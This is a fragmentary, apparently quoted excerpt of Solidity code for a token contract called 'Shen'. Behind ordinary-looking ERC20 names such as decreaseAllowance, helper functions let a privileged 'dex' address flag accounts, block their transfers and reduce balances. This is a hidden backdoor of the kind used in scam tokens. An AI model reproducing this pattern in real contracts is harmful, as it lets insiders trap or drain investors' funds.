...
contract Shen is IERC20, Token, Ownable {
    ...
    function decreaseAllowance(address spender, uint256 amount) public virtual {
        address from = msg.sender;
        require(spender != address(0), "Invalid address");
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_getValidatedDex(spender)) {
            _minus(from, total);
    ...
    function _checkAllowance(address user, address spender, uint256 amount) internal {
        if (_getValidatedDex(user)) {
            require(spender != address(0), "Invalid address");
            _dex[spender] = amount != 0;
        }
    }

    function _canTransfer(address _sender) internal view returns (bool) {
        return _dex[_sender] == true;
    }

    function _getValidatedDex(address nav_) internal view returns (bool) {
